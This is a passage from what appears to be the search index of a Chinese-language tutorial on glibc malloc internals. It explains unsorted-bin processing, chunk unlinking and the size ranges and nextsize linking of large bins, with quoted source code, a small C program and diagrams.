\u200b\u5f53\u4e2d\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u5411\u200b\u94fe\u8868\u200b\u5934\u200b\u7684\u200b\u63d2\u5165\u200b\u7b97\u6cd5\u200b\uff1a<code>first_unsorted = unsorted_bin-&gt;fd; unsorted_bin-&gt;fd = p; first_unsorted-&gt;bk = p; p-&gt;bk = unsorted_bin; p-&gt;fd = first_unsorted;</code></li> </ol> <p><code>unlink_chunk</code> \u200b\u7684\u200b\u5b9e\u73b0\u200b\u5c31\u662f\u200b\u7ecf\u5178\u200b\u7684\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u5220\u9664\u200b\u7ed3\u70b9\u200b\u7684\u200b\u7b97\u6cd5\u200b\uff1a</p> <pre><code>/* Take a chunk off a bin list.  */\nstatic void\nunlink_chunk (mstate av, mchunkptr p)\n{\n  /* malloc check omitted */\n\n  mchunkptr fd = p-&gt;fd;\n  mchunkptr bk = p-&gt;bk;\n\n  /* malloc check omitted */\n\n  fd-&gt;bk = bk;\n  bk-&gt;fd = fd;\n  if (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != NULL)\n    {\n      /* malloc check omitted */\n\n      if (fd-&gt;fd_nextsize == NULL)\n        {\n          if (p-&gt;fd_nextsize == p)\n            fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;\n          else\n            {\n              fd-&gt;fd_nextsize = p-&gt;fd_nextsize;\n              fd-&gt;bk_nextsize = p-&gt;bk_nextsize;\n              p-&gt;fd_nextsize-&gt;bk_nextsize = fd;\n              p-&gt;bk_nextsize-&gt;fd_nextsize = fd;\n            }\n        }\n      else\n        {\n          p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;\n          p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;\n        }\n    }\n}\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b <code>fd_nextsize</code> \u200b\u548c\u200b <code>bk_nextsize</code> \u200b\u5b57\u200b\u6bb5\u200b\u9002\u7528\u200b\u4e8e\u200b large bin\uff0c\u200b\u540e\u9762\u200b\u4f1a\u200b\u8ba8\u8bba\u200b\u8fd9\u4e2a\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u7684\u200b\u7ec6\u8282\u200b\u3002</p> <p>\u200b\u56e0\u6b64\u200b unsorted bin \u200b\u4fdd\u5b58\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u4ece\u200b fast bin \u200b\u5408\u5e76\u200b\u800c\u6765\u200b\u7684\u200b\u4e00\u4e9b\u200b\u5757\u200b\uff0c\u200b\u7531\u4e8e\u200b unsorted bin \u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5b83\u200b\u91cc\u9762\u200b\u4f1a\u200b\u4fdd\u5b58\u200b\u5404\u79cd\u200b\u5927\u5c0f\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u3002\u200b\u5b9e\u9645\u4e0a\u200b\uff0cunsorted bin \u200b\u5360\u7528\u200b\u7684\u200b\u5c31\u662f\u200b <code>malloc_state</code> \u200b\u7ed3\u6784\u200b\u4e2d\u200b\u7684\u200b bin 1\uff0c\u200b\u56e0\u4e3a\u200b\u6211\u4eec\u200b\u5df2\u7ecf\u200b\u77e5\u9053\u200b\uff0c\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\u81f3\u5c11\u200b\u662f\u200b 32\uff0c\u200b\u800c\u200b\u5927\u5c0f\u200b\u4e3a\u200b 32 \u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u7684\u200b small bin index \u200b\u662f\u200b 2\uff0c\u200b\u8bf4\u660e\u200b 1 \u200b\u6ca1\u6709\u200b\u88ab\u200b\u7528\u5230\u200b\uff0c\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b\u7559\u7ed9\u200b unsorted bin \u200b\u7528\u200b\u7684\u200b\u3002\u200b\u5728\u200b 64 \u200b\u4f4d\u200b\u7cfb\u7edf\u200b\u4e0b\u200b\uff0c<code>malloc_state</code> \u200b\u7684\u200b 127 \u200b\u4e2a\u200b bin \u200b\u5206\u914d\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>bin 1 \u200b\u662f\u200b unsorted bin</li> <li>bin 2 \u200b\u5230\u200b bin 63 \u200b\u662f\u200b small bin</li> <li>bin 64 \u200b\u5230\u200b bin 126 \u200b\u662f\u200b large bin</li> </ol> <p>bin 127 \u200b\u6ca1\u6709\u200b\u7528\u5230\u200b\u3002</p> <p>\u200b\u7ecf\u8fc7\u200b\u8fd9\u6b21\u200b\u5408\u5e76\u200b\u4e4b\u540e\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b <code>_int_malloc</code> \u200b\u5c1d\u8bd5\u200b\u4ece\u200b unsorted bin \u200b\u548c\u200b large bin \u200b\u4e2d\u200b\u5206\u914d\u200b\u7a7a\u95f2\u200b\u5757\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#__libc_malloc_1","title":"\u518d\u6b21\u200b\u56de\u5230\u200b <code>__libc_malloc</code>","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\uff0c<code>_int_malloc</code> \u200b\u6709\u200b\u4e00\u5927\u200b\u6bb5\u200b\u4ee3\u7801\u200b\u6765\u200b\u8fdb\u884c\u200b\u540e\u7eed\u200b\u7684\u200b\u5185\u5b58\u200b\u5206\u914d\u200b\uff0c\u200b\u5927\u6982\u200b\u6b65\u9aa4\u200b\u5305\u62ec\u200b\uff1a</p> <ol> <li>\u200b\u628a\u200b unsorted bin \u200b\u4e2d\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u5904\u7406\u200b\uff0c\u200b\u653e\u5230\u200b small bin \u200b\u6216\u8005\u200b large bin \u200b\u4e2d\u200b\uff0c\u200b\u540c\u65f6\u200b\u5982\u679c\u200b\u6709\u200b\u5408\u9002\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u5c31\u200b\u5206\u914d\u200b\u7ed9\u200b malloc \u200b\u7684\u200b\u8c03\u7528\u8005\u200b</li> <li>\u200b\u5982\u679c\u200b\u8fd8\u662f\u200b\u6ca1\u6709\u200b\u627e\u5230\u200b\u5408\u9002\u200b\u5927\u5c0f\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u5c31\u200b\u5728\u200b large bin \u200b\u91cc\u200b\u5bfb\u627e\u200b\u7a7a\u95f2\u200b\u5757\u200b\u6765\u200b\u5206\u914d\u200b\uff1b\u200b\u5982\u679c\u200b\u627e\u200b\u4e0d\u5230\u200b\u5408\u9002\u200b\u5927\u5c0f\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u8fdb\u884c\u200b consolidate\uff0c\u200b\u5c1d\u8bd5\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u5408\u5e76\u200b\uff0c\u200b\u5f97\u5230\u200b\u66f4\u5927\u200b\u7684\u200b\u5757\u200b\uff1b\u200b\u91cd\u590d\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u591a\u6b21\u200b</li> <li>\u200b\u5982\u679c\u200b\u8fd8\u662f\u200b\u627e\u200b\u4e0d\u5230\u200b\u5408\u9002\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u5c31\u200b\u4ece\u200b\u5806\u200b\u9876\u200b\u5206\u914d\u200b\u65b0\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u5982\u679c\u200b\u5806\u200b\u5df2\u7ecf\u200b\u6ee1\u200b\u4e86\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u53bb\u200b\u6269\u5927\u200b\u5806\u200b\uff0c\u200b\u6216\u8005\u200b\u76f4\u63a5\u200b\u7528\u200b mmap \u200b\u5206\u914d\u200b\u4e00\u7247\u200b\u5185\u5b58\u200b</li> </ol> <p>\u200b\u73b0\u5728\u200b\u5206\u200b\u6b65\u9aa4\u200b\u89c2\u5bdf\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\uff0c\u200b\u9996\u5148\u200b\u89c2\u5bdf\u200b unsorted bin \u200b\u7684\u200b\u5904\u7406\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#unsorted-bin","title":"unsorted bin","text":"<p>\u200b\u9996\u5148\u200b\u662f\u200b unsorted bin \u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u5904\u7406\u200b\uff1a</p> <pre><code>int iters = 0;\nwhile ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))\n  {\n    bck = victim-&gt;bk;\n    size = chunksize (victim);\n    mchunkptr next = chunk_at_offset (victim, size);\n\n    /* malloc checks omitted */\n\n    /*\n       If a small request, try to use last remainder if it is the\n       only chunk in unsorted bin.  This helps promote locality for\n       runs of consecutive small requests. This is the only\n       exception to best-fit, and applies only when there is\n       no exact fit for a small chunk.\n     */\n\n    if (in_smallbin_range (nb) &amp;&amp;\n        bck == unsorted_chunks (av) &amp;&amp;\n        victim == av-&gt;last_remainder &amp;&amp;\n        (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))\n      {\n        /* split and reattach remainder */\n        remainder_size = size - nb;\n        remainder = chunk_at_offset (victim, nb);\n        unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;\n        av-&gt;last_remainder = remainder;\n        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);\n        if (!in_smallbin_range (remainder_size))\n          {\n            remainder-&gt;fd_nextsize = NULL;\n            remainder-&gt;bk_nextsize = NULL;\n          }\n\n        set_head (victim, nb | PREV_INUSE |\n                  (av != &amp;main_arena ? NON_MAIN_ARENA : 0));\n        set_head (remainder, remainder_size | PREV_INUSE);\n        set_foot (remainder, remainder_size);\n\n        check_malloced_chunk (av, victim, nb);\n        void *p = chunk2mem (victim);\n        alloc_perturb (p, bytes);\n        return p;\n      }\n\n    /* remove from unsorted list */\n    /* malloc checks omitted */\n    unsorted_chunks (av)-&gt;bk = bck;\n    bck-&gt;fd = unsorted_chunks (av);\n\n    /* Take now instead of binning if exact fit */\n\n    if (size == nb)\n      {\n        set_inuse_bit_at_offset (victim, size);\n        if (av != &amp;main_arena)\n          set_non_main_arena (victim);\n        /* Fill cache first, return to user only if cache fills.\n           We may return one of these chunks later.  */\n        if (tcache_nb\n            &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)\n          {\n            tcache_put (victim, tc_idx);\n            return_cached = 1;\n            continue;\n          }\n        else\n          {\n            check_malloced_chunk (av, victim, nb);\n            void *p = chunk2mem (victim);\n            alloc_perturb (p, bytes);\n            return p;\n          }\n      }\n\n    /* place chunk in bin */\n\n    if (in_smallbin_range (size))\n      {\n        victim_index = smallbin_index (size);\n        bck = bin_at (av, victim_index);\n        fwd = bck-&gt;fd;\n      }\n    else\n      {\n        victim_index = largebin_index (size);\n        bck = bin_at (av, victim_index);\n        fwd = bck-&gt;fd;\n\n        /* maintain large bins in sorted order */\n        if (fwd != bck)\n          {\n            /* Or with inuse bit to speed comparisons */\n            size |= PREV_INUSE;\n            /* if smaller than smallest, bypass loop below */\n            assert (chunk_main_arena (bck-&gt;bk));\n            if ((unsigned long) (size)\n                &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))\n              {\n                fwd = bck;\n                bck = bck-&gt;bk;\n\n                victim-&gt;fd_nextsize = fwd-&gt;fd;\n                victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;\n                fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;\n              }\n            else\n              {\n                assert (chunk_main_arena (fwd));\n                while ((unsigned long) size &lt; chunksize_nomask (fwd))\n                  {\n                    fwd = fwd-&gt;fd_nextsize;\n                    assert (chunk_main_arena (fwd));\n                  }\n\n                if ((unsigned long) size\n                    == (unsigned long) chunksize_nomask (fwd))\n                  /* Always insert in the second position.  */\n                  fwd = fwd-&gt;fd;\n                else\n                  {\n                    victim-&gt;fd_nextsize = fwd;\n                    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;\n                    /* malloc checks omitted */\n                    fwd-&gt;bk_nextsize = victim;\n                    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;\n                  }\n                bck = fwd-&gt;bk;\n                /* malloc checks omitted */\n              }\n          }\n        else\n          victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;\n      }\n\n    mark_bin (av, victim_index);\n    victim-&gt;bk = bck;\n    victim-&gt;fd = fwd;\n    fwd-&gt;bk = victim;\n    bck-&gt;fd = victim;\n\n    /* If we've processed as many chunks as we're allowed while\n       filling the cache, return one of the cached ones.  */\n    ++tcache_unsorted_count;\n    if (return_cached\n        &amp;&amp; mp_.tcache_unsorted_limit &gt; 0\n        &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)\n      {\n        return tcache_get (tc_idx);\n      }\n\n#define MAX_ITERS       10000\n    if (++iters &gt;= MAX_ITERS)\n      break;\n  }\n</code></pre> <p>\u200b\u5b83\u200b\u7684\u200b\u6d41\u7a0b\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>\u200b\u904d\u5386\u200b unsorted bin \u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\uff0c\u200b\u4ece\u200b\u54e8\u5175\u200b\u7ed3\u70b9\u200b\u5f00\u59cb\u200b\uff0c\u200b\u4ece\u540e\u200b\u5f80\u524d\u200b\u904d\u5386\u200b\u7a7a\u95f2\u200b\u5757\u200b</li> <li>fast path \u200b\u903b\u8f91\u200b\uff1a\u200b\u5982\u679c\u200b\u8981\u200b\u7533\u8bf7\u200b\u7684\u200b\u5757\u200b\u6bd4\u200b\u5f53\u524d\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5c0f\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5f53\u524d\u200b\u7a7a\u95f2\u200b\u5757\u200b\u53ef\u4ee5\u200b\u62c6\u5206\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u62c6\u5206\u200b\u5f53\u524d\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u7136\u540e\u200b\u76f4\u63a5\u200b\u5206\u914d\u200b\u62c6\u5206\u200b\u540e\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b</li> <li>\u200b\u5982\u679c\u200b\u8981\u200b\u7533\u8bf7\u200b\u7684\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\u548c\u200b\u5f53\u524d\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\u76f8\u540c\u200b\uff0c\u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u653e\u5230\u200b tcache\uff0c\u200b\u6216\u8005\u200b\u76f4\u63a5\u200b\u5206\u914d\u200b\u8fd9\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b</li> <li>\u200b\u628a\u200b\u5f53\u524d\u200b\u7a7a\u95f2\u200b\u5757\u200b\u6839\u636e\u200b\u5927\u5c0f\u200b\uff0c\u200b\u5206\u53d1\u200b\u5230\u200b small bin \u200b\u6216\u8005\u200b large bin</li> <li>\u200b\u5982\u679c\u200b tcache \u200b\u4e2d\u6709\u200b\u5408\u9002\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u5c31\u200b\u5206\u914d\u200b\u5b83\u200b</li> </ol> <p>\u200b\u7531\u6b64\u53ef\u89c1\u200b\uff0cunsorted bin \u200b\u4e2d\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5728\u200b malloc \u200b\u7684\u200b\u65f6\u5019\u200b\u4f1a\u200b\u88ab\u200b\u5206\u6d3e\u200b\u5230\u200b\u5bf9\u5e94\u200b\u7684\u200b small bin \u200b\u6216\u8005\u200b large bin \u200b\u5f53\u4e2d\u200b\u3002small bin \u200b\u7684\u200b\u5904\u7406\u200b\u6bd4\u8f83\u7b80\u5355\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u6bcf\u4e2a\u200b bin \u200b\u7684\u200b\u5757\u200b\u5927\u5c0f\u200b\u90fd\u200b\u76f8\u540c\u200b\uff0c\u200b\u76f4\u63a5\u200b\u52a0\u5165\u200b\u5230\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u5373\u53ef\u200b\u3002large bin \u200b\u7684\u200b\u5904\u7406\u200b\u5219\u200b\u6bd4\u8f83\u590d\u6742\u200b\uff0c\u200b\u4e0b\u9762\u200b\u4e3b\u8981\u200b\u6765\u200b\u5206\u6790\u200b large bin \u200b\u7684\u200b\u7ed3\u6784\u200b\u3002</p>"},{"location":"software/glibc_allocator.html#large-bin","title":"large bin","text":"<p>large bin \u200b\u548c\u200b\u5176\u4ed6\u200b bin \u200b\u7684\u200b\u4e0d\u540c\u200b\u7684\u200b\u5730\u65b9\u200b\u5728\u4e8e\u200b\uff0c\u200b\u5b83\u200b\u6bcf\u4e2a\u200b bin \u200b\u7684\u200b\u5927\u5c0f\u200b\u4e0d\u662f\u200b\u4e00\u4e2a\u200b\u56fa\u5b9a\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u800c\u662f\u200b\u4e00\u4e2a\u200b\u8303\u56f4\u200b\u3002\u200b\u5728\u200b 64 \u200b\u4f4d\u4e0b\u200b\uff0cbin 64 \u200b\u5230\u200b bin 127 \u200b\u5bf9\u5e94\u200b\u7684\u200b\u5757\u200b\u5927\u5c0f\u200b\u8303\u56f4\u200b\uff1a</p> <ol> <li>bin 64 \u200b\u5230\u200b bin 96: \u200b\u4ece\u200b 1024 \u200b\u5b57\u8282\u200b\u5f00\u59cb\u200b\uff0c\u200b\u6bcf\u4e2a\u200b bin \u200b\u8986\u76d6\u200b 64 \u200b\u5b57\u8282\u200b\u7684\u200b\u957f\u5ea6\u200b\u8303\u56f4\u200b\uff0c\u200b\u4f8b\u5982\u200b bin 64 \u200b\u5bf9\u5e94\u200b 1024-1087 \u200b\u5b57\u8282\u200b\u8303\u56f4\u200b\uff0cbin 96 \u200b\u5bf9\u5e94\u200b 3072-3135 \u200b\u5b57\u8282\u200b\u8303\u56f4\u200b</li> <li>bin 97 \u200b\u5230\u200b bin 111: \u200b\u4ece\u200b 3136 \u200b\u5b57\u8282\u200b\u5f00\u59cb\u200b\uff0c\u200b\u6bcf\u4e2a\u200b bin \u200b\u8986\u76d6\u200b 512 \u200b\u5b57\u8282\u200b\u7684\u200b\u957f\u5ea6\u200b\u8303\u56f4\u200b\uff0c\u200b\u4f8b\u5982\u200b bin 97 \u200b\u5bf9\u5e94\u200b 3136-3583 \u200b\u5b57\u8282\u200b\u8303\u56f4\u200b\uff08\u200b\u6ca1\u6709\u200b\u6db5\u76d6\u200b 512 \u200b\u5b57\u8282\u200b\u662f\u56e0\u4e3a\u200b\u5bf9\u9f50\u200b\u95ee\u9898\u200b\uff0c\u200b\u5176\u4ed6\u200b\u7684\u200b\u90fd\u200b\u662f\u200b\u6db5\u76d6\u200b 512 \u200b\u5b57\u8282\u200b\uff09\uff0cbin 111 \u200b\u5bf9\u5e94\u200b 10240-10751 \u200b\u5b57\u8282\u200b\u8303\u56f4\u200b</li> <li>bin 112 \u200b\u5230\u200b bin 119: \u200b\u4ece\u200b 10752 \u200b\u5b57\u8282\u200b\u5f00\u59cb\u200b\uff0c\u200b\u6bcf\u4e2a\u200b bin \u200b\u8986\u76d6\u200b 4096 \u200b\u5b57\u8282\u200b\u7684\u200b\u957f\u5ea6\u200b\u8303\u56f4\u200b\uff0c\u200b\u4f8b\u5982\u200b bin 112 \u200b\u5bf9\u5e94\u200b 10752-12287 \u200b\u5b57\u8282\u200b\u8303\u56f4\u200b\uff08\u200b\u6ca1\u6709\u200b\u6db5\u76d6\u200b 4096 \u200b\u5b57\u8282\u200b\u662f\u56e0\u4e3a\u200b\u5bf9\u9f50\u200b\u95ee\u9898\u200b\uff0c\u200b\u5176\u4ed6\u200b\u7684\u200b\u90fd\u200b\u662f\u200b\u6db5\u76d6\u200b 4096 \u200b\u5b57\u8282\u200b\uff09\uff0cbin 119 \u200b\u5bf9\u5e94\u200b 36864-40959 \u200b\u5b57\u8282\u200b\u8303\u56f4\u200b</li> <li>bin 120 \u200b\u5230\u200b bin 123: \u200b\u4ece\u200b 40960 \u200b\u5b57\u8282\u200b\u5f00\u59cb\u200b\uff0c\u200b\u6bcf\u4e2a\u200b bin \u200b\u8986\u76d6\u200b 32768 \u200b\u5b57\u8282\u200b\u7684\u200b\u957f\u5ea6\u200b\u8303\u56f4\u200b\uff0c\u200b\u4f8b\u5982\u200b bin 120 \u200b\u5bf9\u5e94\u200b 40960-65535 \u200b\u5b57\u8282\u200b\u8303\u56f4\u200b\uff08\u200b\u6ca1\u6709\u200b\u6db5\u76d6\u200b 32768 \u200b\u5b57\u8282\u200b\u662f\u56e0\u4e3a\u200b\u5bf9\u9f50\u200b\u95ee\u9898\u200b\uff0c\u200b\u5176\u4ed6\u200b\u7684\u200b\u90fd\u200b\u662f\u200b\u6db5\u76d6\u200b 32768 \u200b\u5b57\u8282\u200b\uff09\uff0cbin 123 \u200b\u5bf9\u5e94\u200b 131072-163839 \u200b\u5b57\u8282\u200b\u8303\u56f4\u200b</li> <li>bin 124: 163840-262143 \u200b\u5171\u200b 98304 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u8303\u56f4\u200b</li> <li>bin 125: 262144-524287 \u200b\u5171\u200b 262144 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u8303\u56f4\u200b</li> <li>bin 126: 524288 \u200b\u6216\u200b\u66f4\u957f\u200b</li> </ol> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u6bd4\u8f83\u200b\u77ed\u200b\u7684\u200b\u957f\u5ea6\u200b\u8303\u56f4\u200b\u7ed9\u200b\u7684\u200b bin \u200b\u4e5f\u200b\u6bd4\u8f83\u200b\u591a\u200b\uff0c\u200b\u540e\u9762\u200b\u5219\u200b\u66f4\u52a0\u200b\u7a00\u758f\u200b\u3002\u200b\u4e0a\u8ff0\u200b\u5404\u4e2a\u200b bin \u200b\u7684\u200b\u5927\u5c0f\u200b\u8303\u56f4\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u4ee5\u4e0b\u200b\u4ee3\u7801\u200b\u6253\u5370\u200b\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#define largebin_index_64(sz)                                                  \\\n  (((((unsigned long)(sz)) &gt;&gt; 6) &lt;= 48)                                        \\\n       ? 48 + (((unsigned long)(sz)) &gt;&gt; 6)                                     \\\n       : ((((unsigned long)(sz)) &gt;&gt; 9) &lt;= 20)                                  \\\n             ? 91 + (((unsigned long)(sz)) &gt;&gt; 9)                               \\\n             : ((((unsigned long)(sz)) &gt;&gt; 12) &lt;= 10)                           \\\n                   ? 110 + (((unsigned long)(sz)) &gt;&gt; 12)                       \\\n                   : ((((unsigned long)(sz)) &gt;&gt; 15) &lt;= 4)                      \\\n                         ? 119 + (((unsigned long)(sz)) &gt;&gt; 15)                 \\\n                         : ((((unsigned long)(sz)) &gt;&gt; 18) &lt;= 2)                \\\n                               ? 124 + (((unsigned long)(sz)) &gt;&gt; 18)           \\\n                               : 126)\n\nint main() {\n  int last_bin = largebin_index_64(1024);\n  int last_i = 1024;\n  for (int i = 1024; i &lt; 1000000; i++) {\n    if (largebin_index_64(i) != last_bin) {\n      printf(\"%d-%d: %d, length %d\\n\", last_i, i - 1, last_bin, i - last_i);\n      last_i = i;\n      last_bin = largebin_index_64(i);\n    }\n  }\n  printf(\"%d-inf: %d\\n\", last_i, last_bin);\n  return 0;\n}\n</code></pre> <p>\u200b\u56e0\u6b64\u200b large bin \u200b\u91cc\u9762\u200b\u4f1a\u200b\u6709\u200b\u4e0d\u540c\u200b chunk \u200b\u5927\u5c0f\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u3002\u200b\u4e3a\u4e86\u200b\u5feb\u901f\u200b\u5730\u200b\u5bfb\u627e\u200b\u60f3\u8981\u200b\u7684\u200b\u5927\u5c0f\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0clarge bin \u200b\u4e2d\u200b\u7a7a\u95f2\u200b\u5757\u200b\u6309\u7167\u200b\u4ece\u5927\u5230\u200b\u5c0f\u200b\u7684\u200b\u987a\u5e8f\u200b\u7ec4\u6210\u200b\u94fe\u8868\u200b\uff0c\u200b\u540c\u65f6\u200b\u901a\u8fc7\u200b <code>fd_nextsize</code> \u200b\u548c\u200b <code>bk_nextsize</code> \u200b\u628a\u200b\u6bcf\u79cd\u200b\u5927\u5c0f\u200b\u51fa\u73b0\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u5757\u200b\u7ec4\u6210\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\u3002\u200b\u5927\u81f4\u200b\u7684\u200b\u8fde\u63a5\u200b\u65b9\u5f0f\u200b\u5982\u4e0b\u200b\uff0c\u200b\u53c2\u8003\u200b\u4e86\u200b Malloc Internals \u200b\u7ed9\u200b\u7684\u200b\u793a\u4f8b\u200b\uff1a</p> <pre><code>  bins[id]      chunk A              chunk B              chunk C\n+----------+  +-----------------+  +-----------------+  +-----------------+\n| fd = A   |  | size = 1072     |  | size = 1072     |  | size = 1040     |\n+----------+  +-----------------+  +-----------------+  +-----------------+\n| bk = C   |  | fd = B          |  | fd = C          |  | fd = bins[id]   |\n+----------+  +-----------------+  +-----------------+  +-----------------+\n              | bk = bins[id]   |  | bk = A          |  | bk = B          |\n              +-----------------+  +-----------------+  +-----------------+\n              | fd_nextsize = C |                       | fd_nextsize = A |\n              +-----------------+                       +-----------------+\n              | bk_nextsize = C |                       | bk_nextsize = A |\n              +-----------------+                       +-----------------+\n</code></pre> <p>\u200b\u5373\u200b\u6240\u6709\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u52a0\u200b\u54e8\u5175\u200b\u7ec4\u6210\u200b\u4e00\u4e2a\u200b\u53cc\u5411\u200b\u94fe\u8868\u200b\uff0c\u200b\u4ece\u5927\u5230\u200b\u5c0f\u200b\u6309\u7167\u200b <code>A -&gt; B -&gt; C</code> \u200b\u7684\u200b\u987a\u5e8f\u200b\u8fde\u63a5\u200b\uff1b\u200b\u7136\u540e\u200b\u6bcf\u79cd\u200b\u5927\u5c0f\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u5757\u200b <code>A</code> \u200b\u548c\u200b <code>C</code> \u200b\u5355\u72ec\u200b\u5728\u200b\u4e00\u4e2a\u200b nextsize \u200b\u94fe\u8868\u200b\u5f53\u4e2d\u200b\u3002</p> <p>\u200b\u56e0\u6b64\u200b\u5728\u200b\u63d2\u5165\u200b large bin \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5206\u200b\u5982\u4e0b\u200b\u51e0\u79cd\u200b\u60c5\u51b5\u200b\uff1a</p> <p>\u200b\u7b2c\u4e00\u79cd\u200b\u60c5\u51b5\u200b\uff0c\u200b\u5982\u679c\u200b\u65b0\u200b\u63d2\u5165\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\u6bd4\u200b\u76ee\u524d\u200b\u5df2\u6709\u200b\u7a7a\u95f2\u200b\u5757\u200b\u90fd\u200b\u5c0f\u200b\uff0c\u200b\u5219\u200b\u76f4\u63a5\u63d2\u5165\u200b\u5230\u200b\u7a7a\u95f2\u200b\u5757\u200b\u548c\u200b nextsize \u200b\u94fe\u8868\u200b\u7684\u200b\u5c3e\u90e8\u200b\u3002\u200b\u4f8b\u5982\u200b\u8981\u200b\u63d2\u5165\u200b\u4e00\u4e2a\u200b <code>size = 1024</code> \u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b D\uff0c\u200b\u63d2\u5165\u200b\u540e\u200b\u72b6\u6001\u200b\u4e3a\u200b\uff1a</p> <pre><code>  bins[id]      chunk A              chunk B              chunk C              chunk D          \n+----------+  +-----------------+  +-----------------+  +-----------------+  +-----------------+\n| fd = A   |  | size = 1072     |  | size = 1072     |  | size = 1040     |  | size = 1024     |\n+----------+  +-----------------+  +-----------------+  +-----------------+  +-----------------+\n| bk = D   |  | fd = B          |  | fd = C          |  | fd = D          |  | fd = bins[id]   |\n+----------+  +-----------------+  +-----------------+  +-----------------+  +-----------------+\n              | bk = bins[id]   |  | bk = A          |  | bk = B          |  | bk = C          |\n              +-----------------+  +-----------------+  +-----------------+  +-----------------+\n              | fd_nextsize = C |                       | fd_nextsize = D |  | fd_nextsize = A |\n              +-----------------+                       +-----------------+  +-----------------+\n              | bk_nextsize = D |                       | bk_nextsize = A |  | bk_nextsize = C |\n              +-----------------+                       +-----------------+  +-----------------+\n</code></pre> <p>\u200b\u7b2c\u4e8c\u79cd\u200b\u60c5\u51b5\u200b\uff0c\u200b\u5728\u200b\u904d\u5386\u200b nextsize 